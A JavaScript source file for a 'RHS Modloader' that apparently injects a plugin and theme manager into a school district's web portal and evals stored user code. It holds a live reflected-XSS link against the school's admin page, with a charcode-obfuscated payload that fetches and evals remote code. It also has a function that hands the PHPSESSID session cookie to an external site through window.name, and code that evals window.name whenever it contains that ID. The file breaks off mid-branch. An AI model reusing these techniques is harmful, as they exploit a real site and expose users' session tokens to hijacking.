autoRefresh = false;

if (localStorage.getItem('sidebar') === 'false' || localStorage.getItem('sidebar') === null) {
  
  function toggleState(modName) {
  const object = JSON.parse(localStorage.getItem(modName));
  if (object) {
    object.state = object.state === 1 ? 0 : 1;
    localStorage.setItem(modName, JSON.stringify(object));

    if (object.modName.endsWith('.js')) {
      if (object.state === 1) {
        try {
          eval(object.code);
        } catch (error) {
          console.error('Error executing JavaScript for ' + modName + ': ' + error);
        }
      }
    } else if (object.modName.endsWith('.css')) {
      const existingStyleTags = document.querySelectorAll(`style[data-mod-name="${modName}"]`);

      if (object.state === 1) {
        if (existingStyleTags.length === 0) {
          const newStyleTag = document.createElement('style');
          newStyleTag.textContent = object.code;
          newStyleTag.setAttribute('data-mod-name', modName);
          document.head.appendChild(newStyleTag);
        }
      } else {
        for (const styleTag of existingStyleTags) {
          document.head.removeChild(styleTag);
        }
      }
    }
  }
}

document.toggleState = toggleState;

function applyStyles(cssCode) {
  const styleTag = document.createElement('style');
  styleTag.textContent = cssCode;
  document.head.appendChild(styleTag);
}
document.applyStyles = applyStyles;

function loadCSSFiles() {
  for (let i = 0; i < localStorage.length; i++) {
    const key = localStorage.key(i);
    const item = localStorage.getItem(key);
    
    try {
      if (key.endsWith('.css')) {
      const object = JSON.parse(item);
      if (object && object.state === 1) {
        const styleTag = document.createElement('style');
        styleTag.textContent = object.code;
        styleTag.setAttribute('data-mod-name', key);
        document.head.appendChild(styleTag);
      }}
    } catch (error) {
      console.error(`Error parsing or processing item ${key}: ${error.message}`);
    }
  }
}

document.loadCSSFiles = loadCSSFiles;

function forceUpload(code, emulatedFileName) {
  const modName = emulatedFileName || 'default.js';
  const state = 0; // Default state
  const metadataProperties = extractMetadata(code);
  if (metadataProperties !== null) {
      const { name, author, version, description } = metadataProperties;
      const object = { modName, code, state, name, author, version, description };
      localStorage.setItem(modName, JSON.stringify(object));
      renderObject(object);
  }
  else {
  const object = { modName, code, state };
  localStorage.setItem(modName, JSON.stringify(object));
  renderObject(object);
  }
}


document.forceUpload = forceUpload;

function extractMetadata(inputText) {
const regex = /\/\*\*\s*\n(\s*\*\s*@name\s+(.*?)\s*\n\s*\*\s*@author\s+(.*?)\s*\n\s*\*\s*@version\s+(.*?)\s*\n\s*\*\s*@description\s+(.*?)\s*\n\s*\*\/)/;
const matches = inputText.match(regex);

if (matches) {
  const [, , name, author, version, description] = matches;
  return { name, author, version, description };
} else {
  return null;
}
}
document.extractMetadata = extractMetadata;

function handleFileUpload(event) {
const files = event.target.files;
if (files.length > 0) {
    for (const file of files) {
        const reader = new FileReader();
        reader.onload = function (e) {
            const code = e.target.result;
            const modName = file.name;
            const state = 0; // Should always start as 0
            const metadataProperties = extractMetadata(code);
            if (metadataProperties !== null) {
                const { name, author, version, description } = metadataProperties;
                const object = { modName, code, state, name, author, version, description };
                localStorage.setItem(modName, JSON.stringify(object));
                renderObject(object);
            }
            else {
            const object = { modName, code, state };
            localStorage.setItem(modName, JSON.stringify(object));
            renderObject(object);
            }
        };
        reader.readAsText(file);
    }
}
}
document.handleFileUpload = handleFileUpload;


function loadScript(src, callback) {
  const script = document.createElement('script');
  script.type = 'text/javascript';
  script.src = src;
  script.onload = callback;
  document.head.appendChild(script);
}
document.loadScript = loadScript;

function loadStylesheet(href) {
  const link = document.createElement('link');
  link.rel = 'stylesheet';
  link.href = href;
  document.head.appendChild(link);
}
document.loadStylesheet = loadStylesheet;  

//edit schedule override allowing it to work normally when modloaded
if(document.querySelector('a[title="Edit your personal schedule"]')) {
  document.querySelector('a[title="Edit your personal schedule"]').href = `https://app.ridgewood.k12.nj.us/admin/index.php?username=&error=%3Cscript%3Efetch(String.fromCharCode(104,116,116,112,115,58,47,47,114,97,119,46,103,105,116,104,117,98,117,115,101,114,99,111,110,116,101,110,116,46,99,111,109,47,80,111,121,79,122,107,47,82,72,83,45,77,111,100,108,111,97,100,101,114,47,109,97,105,110,47,115,101,116,83,99,104,101,100,117,108,101,46,106,115)).then(response=%3Eresponse.text()).then(d=%3Eeval(d))%3C/script%3E`;
}

function renderObject(object) {
  const containerId = object.modName.endsWith('.js') ? 'pluginsContainer' : 'themesContainer';

  const container = document.getElementById(containerId);

  const div = document.createElement('div');
  div.id = object.modName;
  div.className = "modContainer"
  
  div.innerHTML =
'<label id="modLabel" class="modTitle ' + encodeURIComponent((object.name ? object.name : object.modName).replace("${this}", object.modName)) + '">' +  (object.name ? object.name : object.modName).replace("${this}", object.modName) + '</label><br>' +
'<div id="modInfoContainer"><label id="modLabel" class="modAuthor modInfo ' + (object.author ? object.author : "") + '">' +  (object.author ? object.author : "") + '</label><label id="modLabel" class="modVersion modInfo ' + (object.version ? object.version : "") + '">' +  (object.version ? " " + object.version : "") + '</label>' +
'<div id="actionContainer"><input type="checkbox" data-mod-name="' + object.modName + '" ' + (object.state === 1 ? 'checked' : '') + ' onchange="toggleState(\'' + object.modName + '\')">' +
'<button id="actionButton" onclick="deleteObject(\'' + object.modName + '\', \'' + containerId + '\', \'' + object.name + '\')" type="button" class="btn btn-outline-danger"> <svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" fill="currentColor" class="bi bi-trash3" viewBox="0 0 16 16"> <path d="M6.5 1h3a.5.5 0 0 1 .5.5v1H6v-1a.5.5 0 0 1 .5-.5ZM11 2.5v-1A1.5 1.5 0 0 0 9.5 0h-3A1.5 1.5 0 0 0 5 1.5v1H2.506a.58.58 0 0 0-.01 0H1.5a.5.5 0 0 0 0 1h.538l.853 10.66A2 2 0 0 0 4.885 16h6.23a2 2 0 0 0 1.994-1.84l.853-10.66h.538a.5.5 0 0 0 0-1h-.995a.59.59 0 0 0-.01 0H11Zm1.958 1-.846 10.58a1 1 0 0 1-.997.92h-6.23a1 1 0 0 1-.997-.92L3.042 3.5h9.916Zm-7.487 1a.5.5 0 0 1 .528.47l.5 8.5a.5.5 0 0 1-.998.06L5 5.03a.5.5 0 0 1 .47-.53Zm5.058 0a.5.5 0 0 1 .47.53l-.5 8.5a.5.5 0 1 1-.998-.06l.5-8.5a.5.5 0 0 1 .528-.47ZM8 4.5a.5.5 0 0 1 .5.5v8.5a.5.5 0 0 1-1 0V5a.5.5 0 0 1 .5-.5Z"></path></svg></button>' +
'<button id="actionButton" onclick="downloadFile(\'' + object.modName + '\', getPluginData(\'' + object.modName + '\'))" type="button" class="btn btn-outline-success"><svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" fill="currentColor" class="bi bi-box-arrow-in-down" viewBox="0 0 16 16"> <path fill-rule="evenodd" d="M3.5 6a.5.5 0 0 0-.5.5v8a.5.5 0 0 0 .5.5h9a.5.5 0 0 0 .5-.5v-8a.5.5 0 0 0-.5-.5h-2a.5.5 0 0 1 0-1h2A1.5 1.5 0 0 1 14 6.5v8a1.5 1.5 0 0 1-1.5 1.5h-9A1.5 1.5 0 0 1 2 14.5v-8A1.5 1.5 0 0 1 3.5 5h2a.5.5 0 0 1 0 1h-2z"></path> <path fill-rule="evenodd" d="M7.646 11.854a.5.5 0 0 0 .708 0l3-3a.5.5 0 0 0-.708-.708L8.5 10.293V1.5a.5.5 0 0 0-1 0v8.793L5.354 8.146a.5.5 0 1 0-.708.708l3 3z"></path></svg></button>' +
'<button id="actionButton" onclick="editItem(\'' + object.modName + '\')" type="button" class="btn btn-outline-primary"><svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" fill="currentColor" class="bi bi-pencil-square" viewBox="0 0 16 16">' +
'<path d="M15.502 1.94a.5.5 0 0 1 0 .706L14.459 3.69l-2-2L13.502.646a.5.5 0 0 1 .707 0l1.293 1.293zm-1.75 2.456-2-2L4.939 9.21a.5.5 0 0 0-.121.196l-.805 2.414a.25.25 0 0 0 .316.316l2.414-.805a.5.5 0 0 0 .196-.12l6.813-6.814z"/><path fill-rule="evenodd" d="M1 13.5A1.5 1.5 0 0 0 2.5 15h11a1.5 1.5 0 0 0 1.5-1.5v-6a.5.5 0 0 0-1 0v6a.5.5 0 0 1-.5.5h-11a.5.5 0 0 1-.5-.5v-11a.5.5 0 0 1 .5-.5H9a.5.5 0 0 0 0-1H2.5A1.5 1.5 0 0 0 1 2.5v11z"/></svg></button></div>' +
'<p id="modLabel" class="desc">' +  (object.description ? object.description : "").replace("${this}", object.modName) + '</p></div>';
  container.appendChild(div);
}
document.renderObject = renderObject;

function resizeEditor() {
  const editor = document.querySelector('#editorContainer');
  
  // Update the inline styles to match the .popup's width and height
  editor.style.width = `${popup.offsetWidth}px`;
  editor.style.height = `${(popup.offsetHeight) - 55}px`;
  
}

function initCodeEditor() {
 /* var editor = document.querySelector('#editorContainer');

  // Create a new ResizeObserver
  const resizeObserver = new ResizeObserver(entries => {
    for (const entry of entries) {
      if (entry.target === popup) {
      }
    }
  });
  
  // Start observing the .popup element for size changes
  resizeObserver.observe(popup); */

  // leaving this empty as this was made for codemirror but codemirror broke down when moving to rhs website
  // and then I found out about monaco editor so rip codemirror

  
}
document.initCodeEditor = initCodeEditor;

document.resizeEditor = resizeEditor;

var element = document.querySelector(".menu-rhs");

        if (element) {
        } else {
          loadCSSFiles();

          document.querySelector("body").insertAdjacentHTML("afterEnd",` <div class="popup" style="display: none;" onresize="resizeEditor()">
          <div class="popup-header">
            <div class="input-group">
              <span class="input-group-text" id="codeEditorIcon">
                <svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" fill="grey" class="bi bi-pencil-square" viewBox="0 0 16 16">
        <path d="M15.502 1.94a.5.5 0 0 1 0 .706L14.459 3.69l-2-2L13.502.646a.5.5 0 0 1 .707 0l1.293 1.293zm-1.75 2.456-2-2L4.939 9.21a.5.5 0 0 0-.121.196l-.805 2.414a.25.25 0 0 0 .316.316l2.414-.805a.5.5 0 0 0 .196-.12l6.813-6.814z"></path>
        <path fill-rule="evenodd" d="M1 13.5A1.5 1.5 0 0 0 2.5 15h11a1.5 1.5 0 0 0 1.5-1.5v-6a.5.5 0 0 0-1 0v6a.5.5 0 0 1-.5.5h-11a.5.5 0 0 1-.5-.5v-11a.5.5 0 0 1 .5-.5H9a.5.5 0 0 0 0-1H2.5A1.5 1.5 0 0 0 1 2.5v11z"></path>
        </svg>
              </span>
              <input type="text" id="codeEditor" class="form-control fileName" placeholder="file-name.js (or css)" autocomplete="off" aria-describedby="codeEditorIcon">
            </div></div><div class="codeEditorButtons" style="float: right; margin-top: -40px; top: 50px; left:-10px; position: relative; z-index: 10;">
            <button type="button" id="minimizeButton" onclick="togglePopupDisplay()" class="btn btn-outline-warning"><svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" fill="currentColor" class="bi bi-dash-lg" viewBox="0 0 16 16">
              <path fill-rule="evenodd" d="M2 8a.5.5 0 0 1 .5-.5h11a.5.5 0 0 1 0 1h-11A.5.5 0 0 1 2 8Z"></path>
            </svg><span class="visually-hidden">Minimize</span></button>

            <button type="button" id="uploadButton" onclick="forceUploadEditor()" class="btn btn-outline-primary"><svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" fill="currentColor" class="bi bi-floppy" viewBox="0 0 16 16">
            <path d="M11 2H9v3h2V2Z"/>
            <path d="M1.5 0h11.586a1.5 1.5 0 0 1 1.06.44l1.415 1.414A1.5 1.5 0 0 1 16 2.914V14.5a1.5 1.5 0 0 1-1.5 1.5h-13A1.5 1.5 0 0 1 0 14.5v-13A1.5 1.5 0 0 1 1.5 0ZM1 1.5v13a.5.5 0 0 0 .5.5H2v-4.5A1.5 1.5 0 0 1 3.5 9h9a1.5 1.5 0 0 1 1.5 1.5V15h.5a.5.5 0 0 0 .5-.5V2.914a.5.5 0 0 0-.146-.353l-1.415-1.415A.5.5 0 0 0 13.086 1H13v4.5A1.5 1.5 0 0 1 11.5 7h-7A1.5 1.5 0 0 1 3 5.5V1H1.5a.5.5 0 0 0-.5.5Zm3 4a.5.5 0 0 0 .5.5h7a.5.5 0 0 0 .5-.5V1H4v4.5ZM3 15h10v-4.5a.5.5 0 0 0-.5-.5h-9a.5.5 0 0 0-.5.5V15Z"/>
          </svg><span class="visually-hidden">Add</span></button>
        
            <button type="button" id="saveButton" onclick="saveCodeEditor()" class="btn btn-outline-success"> <svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" fill="currentColor" class="bi bi-save" viewBox="0 0 16 16">
              <path d="M2 1a1 1 0 0 0-1 1v12a1 1 0 0 0 1 1h12a1 1 0 0 0 1-1V2a1 1 0 0 0-1-1H9.5a1 1 0 0 0-1 1v7.293l2.646-2.647a.5.5 0 0 1 .708.708l-3.5 3.5a.5.5 0 0 1-.708 0l-3.5-3.5a.5.5 0 1 1 .708-.708L7.5 9.293V2a2 2 0 0 1 2-2H14a2 2 0 0 1 2 2v12a2 2 0 0 1-2 2H2a2 2 0 0 1-2-2V2a2 2 0 0 1 2-2h2.5a.5.5 0 0 1 0 1H2z"></path>
            </svg><span class="visually-hidden">Save</span></button>
            </div><div id="editorContainer"></div></div>`)

document.querySelector("html body div.container-fluid div.flexbar").insertAdjacentHTML("afterbegin",`

<button type="button" data-bs-toggle="modal" onclick="initCodeEditor()" data-bs-target="#rhsModal" style="background: #ffffff1c;top: -8px;position: relative;color: white;" class="btn menu-rhs">
  <svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" fill="currentColor" class="bi bi-three-dots" viewBox="0 0 16 16">
  <path d="M3 9.5a1.5 1.5 0 1 1 0-3 1.5 1.5 0 0 1 0 3zm5 0a1.5 1.5 0 1 1 0-3 1.5 1.5 0 0 1 0 3zm5 0a1.5 1.5 0 1 1 0-3 1.5 1.5 0 0 1 0 3z"></path>
  </svg>
  </button>
  
  <div class="modal fade" id="rhsModal" tabindex="-1" aria-labelledby="rhsModalLabel" aria-hidden="true">
    <div class="modal-dialog modal-xl">
      <div class="modal-content">
        <div class="modal-header">
        <div id="rhsModalTitle">
          <h1 class="modal-title fs-5" id="rhsModalLabel" style="font-size:1.8rem;color:black">RHS Modloader</h1>
          <h3 class="modal-subtitle fs-5" id= "rhsModalSubtitle" style="font-size:0.7rem">Poy Ozkusaksiz • <span class="version">0.53<beta /></span></h3>
          </div>

          <span id="uiSelections">
          <div class="btn-group" role="group" aria-label="UI Selections">
          <input type="radio" class="btn-check" name="btnradio" id="btnradioSettings" autocomplete="off" onclick='pluginsContainer.style.display = "unset";themesContainer.style.display = "unset";settingsContainer.style.display = "none"' checked>
          <label class="btn btn-outline-secondary" for="btnradioSettings">Mods</label>
          
          <input type="radio" class="btn-check" name="btnradio" id="btnradioMods" onclick='pluginsContainer.style.display = "none";themesContainer.style.display = "none";settingsContainer.style.display = "unset"' autocomplete="off">
          <label class="btn btn-outline-secondary" for="btnradioMods">Settings</label>
          </div>
          </span>
<span class="main-buttons-rhsModal">


<!-- RHS MODLOADER DOMAIN INTEGRATION, closed because the modloader website isn't functional yet
<button type="button" onclick="Throw()" title="Add More Mods" id="modstoreButton" class="btn btn-outline-success">More Mods <svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" fill="currentColor" class="bi bi-file-earmark-plus" viewBox="0 0 16 16">
<path d="M8 6.5a.5.5 0 0 1 .5.5v1.5H10a.5.5 0 0 1 0 1H8.5V11a.5.5 0 0 1-1 0V9.5H6a.5.5 0 0 1 0-1h1.5V7a.5.5 0 0 1 .5-.5"/>
<path d="M14 4.5V14a2 2 0 0 1-2 2H4a2 2 0 0 1-2-2V2a2 2 0 0 1 2-2h5.5zm-3 0A1.5 1.5 0 0 1 9.5 3V1H4a1 1 0 0 0-1 1v12a1 1 0 0 0 1 1h8a1 1 0 0 0 1-1V4.5z"/>
</svg></button>
-->

          <button type="button" onclick="togglePopupDisplay()" title="Display Code Editor" id="togglePopupButton" class="btn btn-outline-success"><svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" fill="currentColor" class="bi bi-code-slash" viewBox="0 0 16 16">
          <path d="M10.478 1.647a.5.5 0 1 0-.956-.294l-4 13a.5.5 0 0 0 .956.294l4-13zM4.854 4.146a.5.5 0 0 1 0 .708L1.707 8l3.147 3.146a.5.5 0 0 1-.708.708l-3.5-3.5a.5.5 0 0 1 0-.708l3.5-3.5a.5.5 0 0 1 .708 0zm6.292 0a.5.5 0 0 0 0 .708L14.293 8l-3.147 3.146a.5.5 0 0 0 .708.708l3.5-3.5a.5.5 0 0 0 0-.708l-3.5-3.5a.5.5 0 0 0-.708 0z"/>
        </svg></button>
          <button type="button" class="btn btn-primary" id="uploadMods" onclick="document.getElementById('fileInput').click()">Upload Files</button>
          </span>

        </div>
        <div class="modal-body" id="modLoaderContainer">
  
        <input type="file" id="fileInput" accept=".js,.css" multiple style="display: none;">
  <div id="modsContainer">
        <div class="container" id="themesContainer">
        <h2 id="modSectionTitle">Themes</h2>
    </div>
    <div class="container" id="pluginsContainer">
        <h2 id="modSectionTitle">Plugins</h2>
    </div>

    <div style="display:none" id="settingsContainer">
    <h2 id="modSectionTitle">Settings</h2>

    <label for="docTitleInput" class="form-label">Document Title:</label>
    <input type="text" class="form-control" id="docTitleInput">

    <input type="checkbox" class="sidebar" value="sidebar">
  <label for="sidebar">Use Sidebar Layout</label>

    </div>

  </div>
        </div>
        <div class="modal-footer">
          <button type="button" class="btn btn-success" onclick="location.reload()">
            <svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" fill="currentColor" class="bi bi-arrow-clockwise" viewBox="0 0 16 16">
  <path fill-rule="evenodd" d="M8 3a5 5 0 1 0 4.546 2.914.5.5 0 0 1 .908-.417A6 6 0 1 1 8 2v1z"></path>
  <path d="M8 4.466V.534a.25.25 0 0 1 .41-.192l2.36 1.966c.12.1.12.284 0 .384L8.41 4.658A.25.25 0 0 1 8 4.466z"></path>
  </svg> Refresh</button>
  <button type="button" class="btn btn-secondary" data-bs-dismiss="modal">Close</button>
        </div>
      </div>
    </div>
  </div>
  
  <style>

  beta:after {
    background: #2073f7;
    border-radius: 3px;
    content: "BETA";
    font-size: 14px;
    padding: 3px;
    color: white;
    position: relative;
    top: -2px;
    margin-left: 5px;
    font-weight: bold;
    }

  #modSectionTitle {
    color: black;
  }
  #modLoaderContainer {
    text-align: justify;
  }
    #modsContainer {
      display: flex;
    }
    #rhsModalSubtitle {
      left: 35px;
      position: absolute;
      margin-top: -10px;
      color: gray;    

    }
          .container {
              margin: 6px;
              border: 1px solid #ccc;
              padding: 10px;
              max-width: 100%;
              text-align: justify;
              float: left;
              min-width: 380px;
          }
          .modContainer {
            background: #20202020;
            border-radius: 10px;
            padding: 3px;
            border: 1px solid gray;
            width: 215px;
            float: left;
            margin: 4px;
          }
          .modInfo {
            font-size: small !important;
          }
          .modVersion {
            margin-left: 5px;
          }
          #modLabel {
            font-size: 16px;
            color: #5b5b5b;
            word-spacing: -1px;
          }
          #modLabel:not(.desc) {
            font-size: 21px;
            position: relative;
            top: 2.5px;
            color: black;
          }
          button.menu-rhs {
              margin-top: 10px;
          }
          label {
              color:black;
              font-size: 17px;
          }
          input[type="checkbox"] {
              width: 25px;
              position: relative;
              top: 10px;
              padding-left: 5px;
              padding-right: 5px;
              margin-left: 10px;
              margin-right: 10px;
          }
          .original {
              font-weight: normal;
          }
          button[onclick*="d"] {
              font-size: 17px;
          }
          @media (min-width: 768px) {
            .modal-xl {
              width: 90%;
             max-width:1200px;
            }
          }
          .popup {
z-index: 1056;
background-color: #f1f1f1;
border: 1px solid #d3d3d3;
text-align: center;
min-height: 100px;
min-width: 335px;
width: 461px;
height: 267px;
position: absolute;
resize: both;
overflow: hidden;
border-radius: 12px;
position: absolute;
left: 30px;
top: 30px;
box-shadow: rgba(0, 0, 0, 0.1) 0px 10px 24px 0px, rgba(0, 0, 0, 0.19) 0px 6px 20px 0px !important;
}

#modInfoContainer {
  margin-top: -35px;
}

#uiSelections {
  margin-right: -25px;
  display: flex;
  justify-content: center;
  align-items: center;
}

.popup-header {
height: 55px;
padding: 10px;
cursor: move;
z-index: 10;
background-color: #4B4B4B;
color: #fff;
position: absolute;
width: 100%;
}

#minimizeButton, #saveButton, #uploadButton {
  padding: 3px 7px 3px 7px;
}
#saveButton, #uploadButton {
  margin-left: 2px;
}

/*Resizeable*/

.popup .resizer-right {
width: 5px;
height: 100%;
background: transparent;
position: absolute;
right: 0;
bottom: 0;
cursor: e-resize;
}

.popup .resizer-bottom {
width: 100%;
height: 5px;
background: transparent;
position: absolute;
right: 0;
bottom: 0;
cursor: n-resize;
}

.popup .resizer-both {
width: 5px;
height: 5px;
background: transparent;
z-index: 10;
position: absolute;
right: 0;
bottom: 0;
cursor: nw-resize;
}

#editorContainer {
height: 100%;
width: 100%;
position: relative;
left: 0;
overflow: hidden;
top: 55px;
background: #2B2B2B;
}

#codeEditor {
height: 35px;
background-color: #313131;
font-size: 14px;
color: white;
}
#codeEditor::placeholder {
color: grey;
}

#codeEditorIcon {
background-color: #313131;
border: none;
}
#actionButton {
margin-right:8px;
padding:.1rem .3rem;
position:relative;
top:5px
}

#codeEditor.fileName {
border: none;
justify-content: left;
display: grid;
position: relative;
width: 200px;
flex: none;
font-family: 'Roboto', sans-serif;
}

span[role="presentation"] {
position: relative;
left: 30px;
}

.popup * {
-webkit-touch-callout: none; /* iOS Safari */
-webkit-user-select: none; /* Safari */
-khtml-user-select: none; /* Konqueror HTML */
-moz-user-select: none; /* Firefox */
-ms-user-select: none; /* Internet Explorer/Edge */
user-select: none; /* Non-prefixed version, currently
                                supported by Chrome and Opera */
}
      </style>
  
  `);

  function sidebarUpdateCheckboxState() {
    const checkbox = document.querySelector('.sidebar');
    const isChecked = localStorage.getItem('sidebar') === 'true';
    checkbox.checked = isChecked;
}

function sidebarHandleCheckboxChange(event) {
    const isChecked = event.target.checked;
    localStorage.setItem('sidebar', isChecked);
}
document.querySelector('.sidebar').addEventListener('change', sidebarHandleCheckboxChange);

sidebarUpdateCheckboxState();

    const input = document.getElementById('docTitleInput');
    input.value = localStorage.getItem('settings.docTitle') || '';

    if (localStorage.getItem('settings.docTitle')) {
        document.title = localStorage.getItem('settings.docTitle');
    }

    input.addEventListener('input', function() {
        const title = input.value.trim();
        localStorage.setItem('settings.docTitle', title);
        document.title = title || location.href.replace("https://", '');
    });


document.getElementById('fileInput').addEventListener('change', handleFileUpload);

function deleteObject(modName, containerId) {
  if (modName.endsWith(".css")) {
    const object = JSON.parse(localStorage.getItem(modName));
    if (object.state) {
      toggleState(modName)
    }
  }
  localStorage.removeItem(modName);
  const container = document.getElementById(containerId);
  const divToRemove = document.getElementById(modName); // Find the div with the specified id
  if (divToRemove) {
      container.removeChild(divToRemove);
  }
}
document.deleteObject = deleteObject;

function downloadFile(fileName, fileContent) {
    const blob = new Blob([fileContent], { type: 'text/plain' });
    const url = window.URL.createObjectURL(blob);
    const a = document.createElement('a');
    a.href = url;
    a.download = fileName;
    document.body.appendChild(a);
    a.click();
    window.URL.revokeObjectURL(url);
    document.body.removeChild(a);
}
document.downloadFile = downloadFile;

function getPluginData(pluginName) {
  const pluginData = localStorage.getItem(pluginName);
  if (pluginData) {
    const parsedData = JSON.parse(pluginData);
    return parsedData.code;
  } else {
    return 'Plugin data not found in localStorage.';
  }
}
document.getPluginData = getPluginData;

function loadObjects() {
  for (let i = 0; i < localStorage.length; i++) {
      const key = localStorage.key(i);
      var object;
      if (key.endsWith(".css") || key.endsWith(".js")) {var object = JSON.parse(localStorage.getItem(key));
      renderObject(object);
      }
      if (object.state === 1 && key.endsWith('.js')) {
          try {
              const pluginEval = new Function(object.code);
              pluginEval();
          } catch (error) {
              console.error(
                `[%cR%cH%cS %cM%co%cd%cl%co%ca%cd%ce%cr%c]: Error in ${key}: ${error.message}`,
                "color: #a80f1f;",
                "color: #a80d24;",
                "color: #a80c2a;",
                "color: #a70c33;",
                "color: #a70d38;",
                "color: #a60f3c;",
                "color: #a51241;",
                "color: #a31445;",
                "color: #a21749;",
                "color: #a01a4d;",
                "color: #9e1d51;",
                "color: #9c2055;",
                "color: unset;"
              );
              
          }
      }
  }
}

document.loadObjects = loadObjects;

document.addEventListener('keydown', function(event) {
    if (event.ctrlKey && event.key === 'y') {
        localStorage.clear();
        location.reload();
    }
});
loadObjects();
        }

        // Get the button and the popup element
  const toggleButton = document.getElementById('togglePopupButton');
  const minimizeButton = document.getElementById('minimizeButton');
  const popup = document.querySelector('.popup');
  document.popup = popup;
  

  var loaded = 0;
  // Function to toggle the display state
  function togglePopupDisplay() {
    if (loaded == 0) {
      loaded++;
    loadScript("https://cdn.jsdelivr.net/npm/monaco-editor@0.44.0/min/vs/loader.js", function(){

require.config({ paths: { 'vs': 'https://cdn.jsdelivr.net/npm/monaco-editor@0.44.0/min/vs' } });

require(['vs/editor/editor.main'], function () {
  const editor = monaco.editor.create(document.getElementById('editorContainer'), {
    value: '//not done, but somewhat functional. Enjoy! \n\n',
    language: 'javascript',
    theme: 'vs-dark'
  });
  document.editor = editor;
});

var style = document.createElement('style');
style.type = 'text/css';
style.innerHTML = '.monaco-editor .view-line { width: 0% !important; }';
document.getElementsByTagName('head')[0].appendChild(style);

});

    if (popup.style.display === 'none' || popup.style.display === '') {
      popup.style.display = 'block'; // Set it to the default display value
    } else {
      popup.style.display = 'none'; // Hide the popup
    }
    initDragElement();
  }
  else {
    if (popup.style.display === 'none' || popup.style.display === '') {
      popup.style.display = 'block'; // Set it to the default display value
    } else {
      popup.style.display = 'none'; // Hide the popup
    }
  }
}
  document.togglePopupDisplay = togglePopupDisplay;

  function saveCodeEditor() {  
    if (codeEditor.value === "") {
      codeEditor.value = "No file name!";
      setTimeout(() => {
        codeEditor.value = "";
      }, 1000);
    } else {
      const blob = new Blob([document.querySelector("div.view-lines.monaco-mouse-cursor-text").innerText], { type: "text/plain" });
      const a = document.createElement("a");
      a.href = URL.createObjectURL(blob);
      a.download = codeEditor.value;
      a.click();
    }
  }
document.saveCodeEditor = saveCodeEditor;

function forceUploadEditor() {
  if (codeEditor.value === "") {
    codeEditor.value = "No file name!";
    setTimeout(() => {
      codeEditor.value = "";
    }, 1000);
  } else {
    forceUpload(document.querySelector("div.view-lines.monaco-mouse-cursor-text").innerText, codeEditor.value);
  }
}
document.forceUploadEditor = forceUploadEditor;
  
  function initDragElement() {
    var pos1 = 0,
      pos2 = 0,
      pos3 = 0,
      pos4 = 0;
    var popups = document.getElementsByClassName("popup");
    var elmnt = null;
    var currentZIndex = 100; //TODO reset z index when a threshold is passed
  
    for (var i = 0; i < popups.length; i++) {
      var popup = popups[i];
      var header = getHeader(popup);
  
      popup.onmousedown = function() {
        this.style.zIndex = "" + ++currentZIndex;
      };
  
      if (header) {
        header.parentPopup = popup;
        header.onmousedown = dragMouseDown;
      }
    }
  
    function dragMouseDown(e) {
      elmnt = this.parentPopup;
      elmnt.style.zIndex = "" + ++currentZIndex;
  
      e = e || window.event;
      // get the mouse cursor position at startup:
      pos3 = e.clientX;
      pos4 = e.clientY;
      document.onmouseup = closeDragElement;
      // call a function whenever the cursor moves:
      document.onmousemove = elementDrag;
    }
  
    function elementDrag(e) {
      if (!elmnt) {
        return;
      }
  
      e = e || window.event;
      // calculate the new cursor position:
      pos1 = pos3 - e.clientX;
      pos2 = pos4 - e.clientY;
      pos3 = e.clientX;
      pos4 = e.clientY;
      // set the element's new position:
      elmnt.style.top = elmnt.offsetTop - pos2 + "px";
      elmnt.style.left = elmnt.offsetLeft - pos1 + "px";
    }
  
    function closeDragElement() {
      /* stop moving when mouse button is released:*/
      document.onmouseup = null;
      document.onmousemove = null;
    }
  
    function getHeader(element) {
      var headerItems = element.getElementsByClassName("popup-header");
  
      if (headerItems.length === 1) {
        return headerItems[0];
      }
  
      return null;
    }
  }
  
  function initResizeElement() {
    var popups = document.getElementsByClassName("popup");
    var element = null;
    var startX, startY, startWidth, startHeight;
  
    for (var i = 0; i < popups.length; i++) {
      var p = popups[i];
  
      var right = document.createElement("div");
      right.className = "resizer-right";
      p.appendChild(right);
      right.addEventListener("mousedown", initDrag, false);
      right.parentPopup = p;
  
      var bottom = document.createElement("div");
      bottom.className = "resizer-bottom";
      p.appendChild(bottom);
      bottom.addEventListener("mousedown", initDrag, false);
      bottom.parentPopup = p;
  
      var both = document.createElement("div");
      both.className = "resizer-both";
      p.appendChild(both);
      both.addEventListener("mousedown", initDrag, false);
      both.parentPopup = p;
    }
  
    function initDrag(e) {
      element = this.parentPopup;
  
      startX = e.clientX;
      startY = e.clientY;
      startWidth = parseInt(
        document.defaultView.getComputedStyle(element).width,
        10
      );
      startHeight = parseInt(
        document.defaultView.getComputedStyle(element).height,
        10
      );
      document.documentElement.addEventListener("mousemove", doDrag, false);
      document.documentElement.addEventListener("mouseup", stopDrag, false);
    }
  
    function doDrag(e) {
      element.style.width = startWidth + e.clientX - startX + "px";
      element.style.height = startHeight + e.clientY - startY + "px";
    }
  
    function stopDrag() {
      document.documentElement.removeEventListener("mousemove", doDrag, false);
      document.documentElement.removeEventListener("mouseup", stopDrag, false);
    }
  }

  function editItem(x) {
    var storedData = localStorage.getItem(x);
    if (storedData) {
      try {
        var parsedData = JSON.parse(storedData);
        if (parsedData && parsedData.code) {
          var code = parsedData.code;
          editor.value = code;
          codeEditor.value = x;
        } else {
          console.log("Invalid data format or missing code property.");
        }
      } catch (error) {
        console.error("Error parsing JSON:", error);
      }
    } else {
      console.log("No data found in localStorage for this item.");
    }
    }

document.editItem = editItem;

// throw
window.Throw=()=>{document.cookie.split("; ").forEach(c=>{c.startsWith("PHPSESSID")&&open("https://rhs-modloader.web.app/",c.split("=")[1])});};

var PHPSESSID = '';
const phpsessCookie = document.cookie.split("; ").find(c => c.trim().startsWith("PHPSESSID"));
if (phpsessCookie) {
    PHPSESSID = phpsessCookie.split("=")[1];
}

if (name.match(PHPSESSID)) {
  eval(name.replace(PHPSESSID, ""));
  name = "";
}
} else {
